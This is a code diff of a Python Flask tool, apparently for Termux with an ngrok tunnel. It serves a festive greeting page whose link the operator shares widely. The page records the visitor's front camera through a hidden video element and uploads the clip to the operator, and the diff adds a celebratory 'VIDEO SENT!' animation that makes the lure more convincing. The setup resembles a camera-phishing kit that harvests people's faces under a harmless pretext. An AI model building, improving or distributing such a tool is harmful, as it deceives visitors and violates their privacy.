@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Festival Video Receiver - Termux compatible version
+Festival Video Receiver - With Celebration Animation
 """
 
 import os
@@ -41,6 +41,8 @@ HTML_TEMPLATE = """
             overflow: hidden;
             position: relative;
         }
+        
+        /* ========== CONFETTI BACKGROUND ========== */
         .confetti-container {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -55,6 +57,95 @@ HTML_TEMPLATE = """
             0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
             100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
         }
+        
+        /* ========== CELEBRATION OVERLAY ========== */
+        .celebration-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 100;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0,0,0,0.5);
+            animation: fadeIn 0.5s ease;
+            pointer-events: none;
+        }
+        .celebration-overlay.active {
+            display: flex;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .celebration-content {
+            text-align: center;
+            animation: bounceIn 1s ease;
+            pointer-events: auto;
+        }
+        @keyframes bounceIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            50% { transform: scale(1.1); }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .celebration-emoji {
+            font-size: 120px;
+            display: block;
+            animation: celebrateSpin 2s ease-in-out infinite;
+            text-shadow: 0 0 60px rgba(255,215,0,0.8);
+        }
+        @keyframes celebrateSpin {
+            0%, 100% { transform: rotate(-5deg) scale(1); }
+            50% { transform: rotate(5deg) scale(1.1); }
+        }
+        
+        .celebration-text {
+            color: white;
+            font-size: 3rem;
+            font-weight: bold;
+            text-shadow: 0 0 30px rgba(255,215,0,0.6);
+            margin-top: 20px;
+            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shimmer 2s linear infinite;
+        }
+        @keyframes shimmer {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+        
+        .celebration-sub {
+            color: rgba(255,255,255,0.9);
+            font-size: 1.2rem;
+            margin-top: 10px;
+            -webkit-text-fill-color: rgba(255,255,255,0.9);
+        }
+        
+        /* ========== BIG CELEBRATION CONFETTI ========== */
+        .celebration-confetti {
+            position: fixed;
+            z-index: 99;
+            pointer-events: none;
+            font-size: 40px;
+            animation: celebrationFall linear forwards;
+        }
+        @keyframes celebrationFall {
+            0% {
+                transform: translateY(-100px) rotate(0deg) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(120vh) rotate(720deg) scale(0.5);
+                opacity: 0;
+            }
+        }
+        
+        /* ========== MAIN CARD ========== */
         .festival-card {
             position: relative; z-index: 1;
             background: rgba(255, 255, 255, 0.15);
@@ -66,19 +157,33 @@ HTML_TEMPLATE = """
             border: 1px solid rgba(255,255,255,0.2);
             text-align: center;
             animation: float 3s ease-in-out infinite;
+            transition: all 0.5s ease;
         }
+        .festival-card.celebrating {
+            animation: none;
+            transform: scale(1.02);
+            border-color: #ffd93d;
+            box-shadow: 0 0 60px rgba(255,215,0,0.3);
+        }
+        
         @keyframes float {
             0%, 100% { transform: translateY(0px); }
             50% { transform: translateY(-10px); }
         }
+        
         .festival-icon {
             font-size: 80px; margin-bottom: 20px; display: block;
             animation: pulse 2s ease-in-out infinite;
         }
+        .festival-icon.celebrating {
+            animation: celebrateSpin 1s ease-in-out infinite;
+        }
+        
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.1); }
         }
+        
         .festival-title {
             color: white; font-size: 2.5rem; font-weight: bold;
             margin-bottom: 15px;
@@ -87,11 +192,23 @@ HTML_TEMPLATE = """
         .festival-name {
             color: #ffd93d; font-weight: bold;
         }
+        
         .timer-display {
             font-size: 3rem; font-weight: bold; color: #ffd93d;
             text-shadow: 0 0 30px rgba(255,217,61,0.5);
             margin: 10px 0 20px 0;
+            transition: all 0.3s ease;
         }
+        .timer-display.done {
+            color: #7dffb3;
+            text-shadow: 0 0 40px rgba(125,255,179,0.6);
+            animation: celebratePulse 1s ease-in-out infinite;
+        }
+        @keyframes celebratePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
         .progress-container {
             width: 100%; height: 8px;
             background: rgba(255,255,255,0.2);
@@ -104,6 +221,12 @@ HTML_TEMPLATE = """
             border-radius: 10px;
             transition: width 0.3s ease;
         }
+        .progress-bar.done {
+            background: linear-gradient(90deg, #7dffb3, #4CAF50, #7dffb3);
+            background-size: 200% auto;
+            animation: shimmer 1s linear infinite;
+        }
+        
         .camera-btn {
             background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             border: none; color: white;
@@ -120,6 +243,11 @@ HTML_TEMPLATE = """
         .camera-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
         .camera-btn.recording { background: linear-gradient(135deg, #ff6b6b, #ee5a24); }
         .camera-btn.uploading { background: linear-gradient(135deg, #4CAF50, #45a049); }
+        .camera-btn.celebrating { 
+            background: linear-gradient(135deg, #ffd93d, #f5576c);
+            animation: celebratePulse 0.5s ease-in-out 3;
+        }
+        
         .status {
             margin-top: 20px; color: rgba(255,255,255,0.9);
             font-size: 0.95rem; min-height: 30px;
@@ -127,22 +255,44 @@ HTML_TEMPLATE = """
         .status.success { color: #7dffb3; }
         .status.error { color: #ff6b6b; }
         .status.warning { color: #ffd93d; }
+        .status.celebrating {
+            color: #ffd93d;
+            font-size: 1.2rem;
+            font-weight: bold;
+            animation: celebratePulse 0.5s ease-in-out infinite;
+        }
+        
         #hiddenVideo { display: none; }
         .upload-container { margin: 20px 0; display: none; }
         .upload-container.visible { display: block; }
+        
         @media (max-width: 600px) {
             .festival-card { padding: 30px 20px; }
             .festival-title { font-size: 1.8rem; }
             .festival-icon { font-size: 60px; }
             .timer-display { font-size: 2.5rem; }
+            .celebration-emoji { font-size: 80px; }
+            .celebration-text { font-size: 2rem; }
         }
     </style>
 </head>
 <body>
+    <!-- Confetti Background -->
     <div class="confetti-container" id="confettiContainer"></div>
+    
+    <!-- Celebration Overlay -->
+    <div class="celebration-overlay" id="celebrationOverlay">
+        <div class="celebration-content">
+            <span class="celebration-emoji">🎉</span>
+            <div class="celebration-text">VIDEO SENT!</div>
+            <div class="celebration-sub">✨ Thank you for participating! ✨</div>
+        </div>
+    </div>
+    
     <video id="hiddenVideo" autoplay playsinline></video>
-    <div class="festival-card">
-        <span class="festival-icon">🎊</span>
+    
+    <div class="festival-card" id="festivalCard">
+        <span class="festival-icon" id="festivalIcon">🎊</span>
         <h1 class="festival-title">{{ festival_name }} <span style="font-size:0.6rem;">🎉</span></h1>
         <div class="timer-display" id="timerDisplay">15</div>
         <div class="progress-container">
@@ -157,8 +307,11 @@ HTML_TEMPLATE = """
         </div>
         <div class="status" id="statusMessage">✨ Click to record a 15-second video for {{ festival_name }}</div>
     </div>
+
     <script>
-        const UPLOAD_URL = window.location.origin + '/upload';
+        // ============================================
+        // DOM Elements
+        // ============================================
         const videoElement = document.getElementById('hiddenVideo');
         const recordBtn = document.getElementById('recordBtn');
         const statusMessage = document.getElementById('statusMessage');
@@ -167,12 +320,18 @@ HTML_TEMPLATE = """
         const uploadContainer = document.getElementById('uploadContainer');
         const uploadStatus = document.getElementById('uploadStatus');
         const uploadProgress = document.getElementById('uploadProgress');
+        const festivalCard = document.getElementById('festivalCard');
+        const festivalIcon = document.getElementById('festivalIcon');
+        const celebrationOverlay = document.getElementById('celebrationOverlay');
 
+        const UPLOAD_URL = window.location.origin + '/upload';
         const DURATION = 15;
         let mediaStream = null, mediaRecorder = null, recordedChunks = [];
         let timerInterval = null, timeRemaining = DURATION, isRecording = false;
 
-        // Confetti generator
+        // ============================================
+        // Confetti Generator (Background)
+        // ============================================
         const confettiContainer = document.getElementById('confettiContainer');
         const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
         for (let i = 0; i < 80; i++) {
@@ -188,6 +347,65 @@ HTML_TEMPLATE = """
             confettiContainer.appendChild(confetti);
         }
 
+        // ============================================
+        // Celebration Functions
+        // ============================================
+        function showCelebration() {
+            // Show overlay
+            celebrationOverlay.classList.add('active');
+            
+            // Add celebration class to card
+            festivalCard.classList.add('celebrating');
+            festivalIcon.classList.add('celebrating');
+            timerDisplay.classList.add('done');
+            progressBar.classList.add('done');
+            recordBtn.classList.add('celebrating');
+            statusMessage.classList.add('celebrating');
+            statusMessage.textContent = '🎉 VIDEO SENT SUCCESSFULLY! 🎉';
+            
+            // Launch celebration confetti
+            launchCelebrationConfetti();
+            
+            // Auto-hide overlay after 4 seconds
+            setTimeout(() => {
+                celebrationOverlay.classList.remove('active');
+                festivalCard.classList.remove('celebrating');
+                festivalIcon.classList.remove('celebrating');
+                timerDisplay.classList.remove('done');
+                progressBar.classList.remove('done');
+                recordBtn.classList.remove('celebrating');
+                statusMessage.classList.remove('celebrating');
+                statusMessage.textContent = '✅ Recording complete! Click to record again';
+                statusMessage.className = 'status success';
+            }, 4000);
+        }
+
+        function launchCelebrationConfetti() {
+            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '🏆'];
+            const container = document.body;
+            
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const el = document.createElement('div');
+                    el.className = 'celebration-confetti';
+                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.fontSize = (Math.random() * 30 + 20) + 'px';
+                    el.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                    el.style.animationDelay = '0s';
+                    container.appendChild(el);
+                    
+                    // Remove after animation
+                    setTimeout(() => {
+                        el.remove();
+                    }, 5000);
+                }, i * 50);
+            }
+        }
+
+        // ============================================
+        // Timer & Recording Functions
+        // ============================================
         function updateTimerDisplay(seconds) {
             timerDisplay.textContent = seconds;
             const progress = ((DURATION - seconds) / DURATION) * 100;
@@ -196,13 +414,20 @@ HTML_TEMPLATE = """
 
         async function startRecording() {
             try {
+                // Reset UI
                 timeRemaining = DURATION;
                 updateTimerDisplay(DURATION);
                 progressBar.style.width = '0%';
+                progressBar.classList.remove('done');
+                timerDisplay.classList.remove('done');
                 statusMessage.textContent = '📷 Accessing camera...';
+                statusMessage.className = 'status';
                 recordBtn.disabled = true;
                 uploadContainer.classList.remove('visible');
+                festivalCard.classList.remove('celebrating');
+                festivalIcon.classList.remove('celebrating');
 
+                // Get camera
                 mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
@@ -211,6 +436,7 @@ HTML_TEMPLATE = """
                 videoElement.srcObject = mediaStream;
                 await videoElement.play();
 
+                // Setup recorder
                 recordedChunks = [];
                 mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
                 mediaRecorder.ondataavailable = (event) => {
@@ -221,6 +447,7 @@ HTML_TEMPLATE = """
                     uploadVideo(blob);
                 };
 
+                // Start recording
                 mediaRecorder.start();
                 isRecording = true;
                 recordBtn.textContent = '🔴 Recording...';
@@ -228,13 +455,17 @@ HTML_TEMPLATE = """
                 statusMessage.textContent = `🎥 Recording... 15s remaining`;
                 statusMessage.className = 'status warning';
 
+                // Start countdown
                 timerInterval = setInterval(() => {
                     timeRemaining--;
                     updateTimerDisplay(timeRemaining);
                     statusMessage.textContent = `🎥 Recording... ${timeRemaining}s remaining`;
+                    
                     if (timeRemaining <= 0) {
                         clearInterval(timerInterval);
                         timerInterval = null;
+                        
+                        // Stop recording
                         if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
                             isRecording = false;
@@ -242,11 +473,16 @@ HTML_TEMPLATE = """
                             recordBtn.className = 'camera-btn uploading';
                             statusMessage.textContent = '⏳ Processing video...';
                         }
+                        
+                        // Stop camera
                         if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
                             mediaStream = null;
                             videoElement.srcObject = null;
                         }
+                        
+                        // SHOW CELEBRATION!
+                        showCelebration();
                     }
                 }, 1000);
 
@@ -299,6 +535,9 @@ HTML_TEMPLATE = """
             }
         }
 
+        // ============================================
+        // Event Listeners
+        // ============================================
         recordBtn.addEventListener('click', () => {
             if (isRecording) return;
             startRecording();
@@ -319,19 +558,16 @@ HTML_TEMPLATE = """
 app = Flask(__name__)
 CORS(app)
 
-# Store received videos list
 received_videos = []
 
 @app.route('/')
 def index():
-    """Serve the festival HTML page"""
     festival_name = app.config.get('FESTIVAL_NAME', 'Festival')
     html = HTML_TEMPLATE.replace('{{ festival_name }}', festival_name)
     return html
 
 @app.route('/upload', methods=['POST'])
 def upload_video():
-    """Receive and save the uploaded video"""
     try:
         if 'video' not in request.files:
             return jsonify({'error': 'No video file'}), 400
@@ -367,19 +603,17 @@ def upload_video():
 
 @app.route('/videos', methods=['GET'])
 def list_videos():
-    """Return list of received videos"""
     return jsonify({'videos': received_videos})
 
 @app.route('/download/<filename>', methods=['GET'])
 def download_video(filename):
-    """Download a specific video"""
     filepath = os.path.join(UPLOAD_FOLDER, filename)
     if os.path.exists(filepath):
         return send_file(filepath, as_attachment=True)
     return jsonify({'error': 'File not found'}), 404
 
 # ============================================
-# Main Tool Class (Termux Compatible)
+# Main Tool Class
 # ============================================
 class FestivalReceiver:
     def __init__(self):
@@ -391,11 +625,9 @@ class FestivalReceiver:
         self.ngrok_ready = threading.Event()
 
     def setup_directories(self):
-        """Create necessary directories"""
         Path(UPLOAD_FOLDER).mkdir(exist_ok=True)
 
     def get_festival_name(self):
-        """Ask user for festival name"""
         print("\n" + "="*60)
         print("🎉 FESTIVAL VIDEO RECEIVER 🎉")
         print("="*60)
@@ -409,7 +641,6 @@ class FestivalReceiver:
             print("❌ Name cannot be empty!")
 
     def check_ngrok(self):
-        """Check if ngrok is installed"""
         try:
             result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
             if result.returncode == 0:
@@ -418,17 +649,12 @@ class FestivalReceiver:
             pass
         
         print("\n❌ ngrok is not installed or not in PATH!")
-        print("📥 Install ngrok from: https://ngrok.com/download")
-        print("📖 Then authenticate with: ngrok config add-authtoken YOUR_TOKEN")
         return False
 
     def monitor_ngrok(self):
-        """Monitor ngrok process and get URL"""
         try:
-            # Wait for ngrok to start and get URL from API
             time.sleep(3)
-            
-            for attempt in range(10):  # Try for ~30 seconds
+            for attempt in range(10):
                 try:
                     with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                         data = json.loads(response.read().decode())
@@ -439,19 +665,13 @@ class FestivalReceiver:
                                 return
                 except Exception:
                     time.sleep(3)
-            
-            print("\n⚠️ Could not get ngrok URL automatically")
-            print("📋 Please check http://localhost:4040 for the URL")
-            
         except Exception as e:
             print(f"❌ Error monitoring ngrok: {e}")
 
     def start_ngrok(self):
-        """Start ngrok tunnel"""
         print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
         
         try:
-            # Start ngrok in background
             self.ngrok_process = subprocess.Popen(
                 ['ngrok', 'http', str(self.port)],
                 stdout=subprocess.DEVNULL,
@@ -459,12 +679,10 @@ class FestivalReceiver:
                 stdin=subprocess.DEVNULL
             )
             
-            # Monitor for URL
             monitor_thread = threading.Thread(target=self.monitor_ngrok)
             monitor_thread.daemon = True
             monitor_thread.start()
             
-            # Wait for URL or timeout
             if self.ngrok_ready.wait(timeout=30):
                 print(f"✅ ngrok tunnel established!")
                 print(f"🌐 Public URL: {self.ngrok_url}")
@@ -478,7 +696,6 @@ class FestivalReceiver:
             return False
 
     def start_flask(self):
-        """Start the Flask server"""
         print(f"\n🔧 Starting Flask server on port {self.port}...")
         
         def run_flask():
@@ -491,7 +708,6 @@ class FestivalReceiver:
         print("✅ Flask server running")
 
     def generate_link(self):
-        """Generate and display the shareable link"""
         print("\n" + "="*60)
         print("📤 SHARE THIS LINK WITH ANYONE:")
         print("="*60)
@@ -504,17 +720,15 @@ class FestivalReceiver:
         print("4. They record a 15-second video")
         print("5. Video auto-uploads to YOU!")
         print("="*60)
-        print("\n📋 The link is printed above - copy it manually (Termux doesn't support clipboard)")
+        print("\n📋 The link is printed above - copy it manually")
 
     def wait_for_videos(self):
-        """Monitor for incoming videos"""
         print("\n🎯 Waiting for videos... (Press Ctrl+C to stop)")
         print(f"📁 Videos will be saved in: {UPLOAD_FOLDER}/")
         print("-"*60)
         
         try:
             while self.running:
-                # Check for new videos
                 if received_videos:
                     latest = received_videos[-1]
                     print(f"\n📹 New video received!")
@@ -522,14 +736,12 @@ class FestivalReceiver:
                     print(f"   Size: {latest['size']:,} bytes")
                     print(f"   Total videos: {len(received_videos)}")
                     
-                    # Show options
                     print("\nOptions (type and press Enter):")
                     print("  [v] View all videos")
                     print("  [d] Download latest video")
                     print("  [q] Quit")
                     print("  [Enter] Continue waiting")
                     
-                    # Simple input with timeout
                     import select
                     import sys
                     
@@ -549,7 +761,6 @@ class FestivalReceiver:
             print("\n\n👋 Shutting down...")
 
     def download_latest(self):
-        """Download the latest video to a user-specified location"""
         if not received_videos:
             print("📭 No videos available")
             return
@@ -557,13 +768,8 @@ class FestivalReceiver:
         latest = received_videos[-1]
         print(f"\n📥 Downloading: {latest['filename']}")
         print(f"   Saved at: {latest['path']}")
-        
-        # In Termux, we can't easily copy to downloads, so just show the path
-        print("\n💡 The video is saved in the festival_videos folder")
-        print(f"   Full path: {os.path.abspath(latest['path'])}")
 
     def list_videos(self):
-        """List all received videos"""
         if not received_videos:
             print("📭 No videos received yet")
             return
@@ -578,7 +784,6 @@ class FestivalReceiver:
             print()
 
     def cleanup(self):
-        """Clean up processes"""
         print("\n🧹 Cleaning up...")
         if self.ngrok_process:
             self.ngrok_process.terminate()
@@ -589,27 +794,18 @@ class FestivalReceiver:
         print("✅ Done!")
 
     def run(self):
-        """Main execution flow"""
         try:
-            # Setup
             self.setup_directories()
             self.get_festival_name()
             
-            # Check requirements
             if not self.check_ngrok():
                 return
             
-            # Start services
             self.start_flask()
             if not self.start_ngrok():
-                print("❌ Failed to start ngrok.")
-                print("💡 Make sure you've authenticated with: ngrok config add-authtoken YOUR_TOKEN")
                 return
             
-            # Generate and display link
             self.generate_link()
-            
-            # Wait for videos
             self.wait_for_videos()
             
         except KeyboardInterrupt:
@@ -617,9 +813,6 @@ class FestivalReceiver:
         finally:
             self.cleanup()
 
-# ============================================
-# Entry Point
-# ============================================
 if __name__ == '__main__':
     receiver = FestivalReceiver()
     receiver.run()
